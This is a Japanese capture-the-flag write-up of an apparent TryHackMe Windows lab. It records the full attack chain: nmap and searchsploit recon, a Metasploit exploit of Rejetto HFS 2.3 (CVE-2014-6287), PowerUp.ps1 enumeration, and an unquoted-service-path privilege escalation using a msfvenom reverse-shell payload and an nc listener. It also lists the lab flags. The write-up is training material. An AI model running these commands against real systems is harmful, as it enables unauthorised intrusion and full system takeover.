## Task1：introduction
### Q：今月の最優秀社員は誰ですか
#### 説　明
- `Reverse image search`により探索
- ブラウザでウェブサイト開いて画像のリンクを保存
- リンクに名前が記載されている  
  
#### 解　答
`Bill Harper`  
  
![image](https://github.com/y-uoh/THM/assets/169203901/eec505d9-d946-455c-9677-6056ae8d1542)  
-> 画僧のリンクをコピーする  
  
  
![image](https://github.com/y-uoh/THM/assets/169203901/de53da1e-2fc8-4966-95e2-cdf29904b038)  
-> アドレスバーにコピーしたURLを張り付けると`BillHarper.png`と名前らしい記載を発見  
  
  
## Task2：初期アクセス
### Q：nmapを使用しマシンをスキャンする。Webサーバーを実行している他のポートは何か
#### 実施コマンド
```bash
nmap -sV 10.10.221.130
```
#### 説　明
- 動作しているサービスのバージョンを確認(-sV)
  - 稼働しているサービスのバージョンを取得します。また、動作しているOS情報も取得できます。  
  
#### 解　答
`8080ポート`

![image](https://github.com/y-uoh/THM/assets/169203901/d1d274a2-f160-44d5-93dc-4b046f18b240)  
  
### Q：Webサーバーで実行されているファイルサーバーは何ですか
#### 実施コマンド
#### 説　明
- ブラウザからアクセスする
- httpfileserver2.3とあるので、これが起動していると思料し、解答。これは誤り
- よく調べてみると、`httpfileserver`は`jefetto.com`という公式のサイトがあることがわかる
  
#### 解　答
`Rejetto Http file server`  
  
![image](https://github.com/y-uoh/THM/assets/169203901/cac9e3b3-b37b-4582-8782-1daa366648a3)  
-> `HttpfileServer 2.3`とあるので、これかと思うが､､､  
  
![image](https://github.com/y-uoh/THM/assets/169203901/01544f1b-5d6e-478e-bfbb-c62da137957b)  
-> リンクに飛ぶと`rejetto.com`というHFSの公式サイトに飛ぶため、HFSの開発元？まで探索することっぽい  
  
### Q：このファイルサーバーを悪用するためのCVE番号は何か
#### 実施コマンド
```bash
searchsploit HttpFileServer 2.3
```
#### 説　明
- `searchsploit`で探索
- ヒットした`Exploit Title`を当てに`EXPLOIT DATABASE`で検索しヒット  

#### 解　答
`2014-6284`  
  
![image](https://github.com/y-uoh/THM/assets/169203901/60171acc-e6e6-42bf-a58a-4235a0d08a9f)  
-> 当てを付けるために検索。必要ないか？  
  
![image](https://github.com/y-uoh/THM/assets/169203901/74c518e5-595b-41cc-87e5-264672cde271)  
![image](https://github.com/y-uoh/THM/assets/169203901/aeb24bc4-7211-4cd3-9006-2a14e87813f9)  
-> 一件ヒットし、内容を確認してCVE取得

### Q：Metasploitを使用して初期アクセスを獲得する。ユーザフラグは何か
#### 実施コマンド
```bash
msfconsole -q
search cve:2014-6287
use 0
options
set RHOSTS 10.10.221.130
set RPORT 8080
set TARGETURI http://10.10.221.130:8080
set LHOST 10.9.0.83
run
meterpriter > shell
where /R  \ *.txt
type C:\users\bill\desktop\user.txt
```
#### 説　明
- `msfconsole -q`
  - Metasploit起動
- `search cve:2014-6287`
  - `search`でエクスプロイトを検索
  - `cve:`オプションは、CVE検索
- `use 0`
  - ひとつしかないので、それを選択
- `options`
  - 設定内容を確認、設定
  - `set RHOSTS 10.10.221.130` -> ターゲットのIPを指定
  - `set RPORT 8080` -> ターゲットのポートを指定
  - `set TARGETURI http://10.10.221.130:8080` -> ターゲットのURIを指定
  - `set LHOST 10.9.0.83` -> 自分のIPを指定
- `run`
  - 実　行
- `meterpriter > shell`
  - 探索方法が`where`コマンドしか思いつかなかったので、shellに移行
  - `meterpriter`でも`search`コマンドを使えば、検索できることは他の人の`write up`を見て知った。
    - `meterpriter > search -f *.txt`
      - 全ディレクトリを再帰的に探索する
      - `-f` -> ファイル探索
      - `*.txt` -> ワイルドカード使用で、`.txt`の付くファイルを探索
- `where /R  \ *.txt`
  - `where`コマンドで全ディレクトリを探索
- `type C:\users\bill\desktop\user.txt`
  - 探索で`user.txt`を発見したので、開いてフラグゲット 
#### 解　答
ユーザーフラグ：`b04763b6fcf51fcd7c13abc7db4fd365`  
    
![image](https://github.com/y-uoh/THM/assets/169203901/217c39b4-7040-49f9-a883-55d74b281ebf)  
![image](https://github.com/y-uoh/THM/assets/169203901/e70fe58a-322f-4751-a04d-cbafde92803c)  
![image](https://github.com/y-uoh/THM/assets/169203901/30671350-95af-4896-97d6-47bcd763f158)  
![image](https://github.com/y-uoh/THM/assets/169203901/cef89622-7d6a-484a-87f2-7403ec6e2c39)  
![image](https://github.com/y-uoh/THM/assets/169203901/c59c06de-6bed-41e2-8fc6-e2ef9cd5c5e7)  
![image](https://github.com/y-uoh/THM/assets/169203901/03a4c3ee-4ed0-43a6-8e03-88417a8ed56d)  
![image](https://github.com/y-uoh/THM/assets/169203901/ffd06591-03b6-483e-85c0-232784382363)  
![image](https://github.com/y-uoh/THM/assets/169203901/181ebef4-734b-4d7d-8d8c-52c2d35d0124)
  
### Q：PowerUp.ps1を実行しろ
### 前　提
#### PowerUp.ps1とは
公式によると、
> `PowerUp.ps1`は、Windowsマシンを評価し、あらゆる異常を判定するスクリプト  
  
とのことらしい。その他write upなどで確認してみたが、つまるところ**『Windowsの脆弱性を検索してくれるPoCのようなもの』**とのというところと判断

#### 実施コマンド
```bash
find / -name *PowerUp* 2>null
meterpreter > upload /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1
meterpreter > load powershell
meterpreter > powershell_shell
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks
```
#### 説　明
- `find / -name *PowerUp* 2>null`
  - `PowerUp.ps1`は、Kaliにデフォルトでインストールされているので、実行体をパスを検索する
  - 公式では、Gitなどにあるから探してダウンロードして使え的なことが書いてあったので、PoCを使う感覚で探すこともできると思われる
- `meterpreter > upload /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1`
  - `meterpreter`でアップロードする。
  - `meterpreter_shell`の`upload`コマンドでローカルのデータをターゲットにアップロードすることができる。
  - 書式 -> `upload <アップロードしたいファイルのパス>`
  - アップロード先はおそらくターゲットのカレントディレクトだと思われる
- `meterpreter > load powershell`
  - `meterpreter`の`loadコマンド`はフレームワークプラグインをロードするコマンド
  - よくわからないが、プラグインといってるくらいなので、`PowerShell`を使うために呼び出してプラグインしているのだろう
- `meterpriter > powershell_shell`
  - んで、実際に`powershell`を使うためのコマンドがこれ
- `PS > . .\PowerUp.ps1`
  - PowerUp.ps1の実行
  - 書式 -> `<ファイルパス> .\<ファイル名>`
    - 今回でいうと、ファイルパスがカレントディレクトリになるため`.`を指定。なおカレントディレクトリなら指定しなくてもよい
    - `.\`はLinuxでいう`./`に相当するものと思われる
- `PS > Invoke-AllChecks`
  - `PowerUp.ps1`内で使われているコマンドレット
  - これを実行することで、`PowerUp.ps1`の機能である脆弱性の検索が実行できるようになる


#### 解　答
  
![image](https://github.com/y-uoh/THM/assets/169203901/d5f3df66-e1b5-4243-a4bc-df65dbf4371d)  
-> `PowerUp.ps1`のパスを検索  
  
![image](https://github.com/y-uoh/THM/assets/169203901/a5f23011-67a9-44aa-9366-bb9dbc21b440)  
-> `meterpreter`の`upload`コマンドで、`PowerUp.ps1`をターゲットにアップロード  
  
![image](https://github.com/y-uoh/THM/assets/169203901/8b0f6e9e-c474-4135-b3fa-e208eb58ae3f)  
-> `powershell`をプラグインして、`powershell`を起動。この辺は`powershell`を使うためのおまじないのようなもん  
  
![image](https://github.com/y-uoh/THM/assets/169203901/b9e9e963-4f78-4c68-9dee-a79f6b5d1941)  
-> `PowerUp.ps1`の実行
  
### Q：Unquoted Service Path脆弱性を持つサービス名は？
#### `PowerUp.ps1`の実行結果
![image](https://github.com/y-uoh/THM/assets/169203901/95ef8960-1278-4a96-91ac-d1620d130408)  
  
#### Unquoted Service Path脆弱性とは何か。
write up曰く、、、  
> 簡単にいうと、Pathがプログラム上で`"`などで囲まれていないという脆弱性。というか設定ミス  
  
それを判定するには公式曰く、、、
> `CanRestart`の項目が`True`になっているものに脆弱性がある  
  
#### 解　答
上記を踏まえての解答 -> `AdvancedSystemCareService9`  

### Q：リバースシェルを実行し、ルートフラグを取得せよ
#### 実施コマンド
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.0.83 LPORT=1234 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
meterpreter > upload "/home/kali/Advanced.exe" "C:\Program Files (x86)\IObit\Advanced.exe"
kali > nc -lnvp 1234
meterpreter > shell
C:\windows\system32 > net stop AdvancedSystemCareService9
C:\windows\system32 > net start AdvancedSystemCareService9
kali > C:\windows\system32 > whoami
kali > C:\windows\system32 > where /R \ root.txt
kali > C:\Users\Administrator\Desktop\root.txt
```
#### 説　明
- `msfvenom -p windows/shell_reverse_tcp LHOST=10.9.0.83 LPORT=1234 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe`
  - ペイロードの作成
  - 公式の通り
- `meterpreter > upload "/home/kali/Advanced.exe" "C:\Program Files (x86)\IObit\Advanced.exe"`
  - 作成したペイロードのアップロード
  - `meterpreter`のupload`コマンドは`upload "<アップロード元のパス>" "<アップロード先のパス>"`でアップロード先を指定できる
  - パスを`"(ダブルクォーテーション）`で囲むのがポイント
- `kali > nc -lnvp 1234`
  - リバースシェル待ち受け
- `meterpreter > shell`
  - シェル起動
- `C:\windows\system32 > net stop AdvancedSystemCareService9`,`C:\windows\system32 > net start AdvancedSystemCareService9`
  - サービスの停止と開始。要は再起動した
  - `windows`のサービスの起動・停止は`net`コマンドが`sc`コマンド
  - `net <start or stop> <サービス名>`,`sc <start or stop> <サービス名>`といった感じで使い方も似てる
- `kali > C:\windows\system32 > whoami`
  - 自分確認
- `kali > C:\windows\system32 > where /R \ root.txt`
  - ルートフラグ探索
  - `write up`曰く、`C:\dir /s root.txt`のようにCドライブの真下まで移動すれば`dir`でも探せるっぽい
- kali > C:\Users\Administrator\Desktop\root.txt
  - root.txtを開く 
  
#### 実行内容の詳細
今までの調査の中で、`AdvancedSystemCareService9`というサービスに`Unquoted Service Path脆弱性`があることが分かった  
そしてそのサービスの実行体が置いてあるパスが`C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe`であるらしい  
おそらくOSは`AdvancedSystemCareService9`を起動するために、サービスの実行体が置いてある`C:\Program Files (x86)\IObit\`を読みに行くだろうから、  
サービス実行体である`ASCService.exe`を悪意のあるペイロードが含む実行体`に改ざんすれば、リバースシェルがとれるという戦術が立てられそうだ。  
上記の思考過程をフローで表すと以下のような感じなる
1. ペイロードの作成
2. ペイロードの配送
3. リバースシェルの待ち受け
4. サービスの再起動
5. shellの取得  
6. フラグの取得  
  
このフローを`##実施コマンド`で実施したという流れである  
  
#### 解　答
`9af5f314f57607c00fd09803a587db80`  

# 参　考
## whereコマンド
- windowsコマンド
- linuxの`find`に相当  
  
### 書　式
```bash
where <オプション> <検索対象ディレクトリ> <検索ファイル名>
```
  
### 代表的なオプション
- `/T`
  - 一致した全てのファイルのサイズ、最終変更日、時刻を表示
- `/R <検索対象ディレクトリ>
  - 指定したディレクトリから検索ファイルを再帰的に検索し表示

###　検索のコツ
- `*.*`
  - 全てのファイルを検索
  - ワイルドカードを使って全検索
- `<ファイル名>.*`
  - ファイル名の一致
  - 拡張子はなんでもよい
- `*.txt`
  - 拡張子の一致
  - ファイル名はなんでもよい
  - 個人的には最も利用パターンが多い  
  
### 実行例
#### CASE1
Cドライブ内の文字列`password`を含むファイルを検索  
```cmd
where /R C:\ password.*
```  
  
#### CASE2
全てのディレクトリから拡張子が`.txt`のファイルを検索  
```cmd
where /R \ *.txt
```  

## meterpriterコマンド
### shearchコマンド
- `meterpriter`での検索コマンド
### 書　式
```bash
meterpriter > search <オプション> <検索ファイル名>
```
  
### 説　明
- ディレクトリを指定しないと、デフォルトでは全ディレクトリを再帰的に探索する
  
### オプション
- `-f`
  - ファイルを探索
  
### 検索のコツ
`where`や`find`と同様ワイルドカード使える大体いつもと同じ感じ   
- `*.*`
  - 全てのファイルを検索
  - ワイルドカードを使って全検索
- `<ファイル名>.*`
  - ファイル名の一致
  - 拡張子はなんでもよい
- `*.txt`
  - 拡張子の一致
  - ファイル名はなんでもよい
  - 個人的には最も利用パターンが多い
  
### 実行例
全てのディレクトリから拡張子が`.txt`のファイルを検索  
```bash
meterpriter > search -f *.txt`
```
  
[meterpreterの使えるコマンド一覧 - Capture The Frog](https://qwertytan.hatenablog.jp/entry/2021/08/31/142202)
[Kali Linux2022.1 でハッキングラボをつくってみる 5 Windows7をハッキングする編3(Metasploit Frameworkを使う前編） - Qiita](https://qiita.com/kagirohi/items/e36a1080d6eeef2e2503)  
  
  
## フレームワーク　※コピーして使用！
## Task：
### Q：
#### 実施コマンド
```bash

```
#### 説　明
- 
- 
#### 解　答
  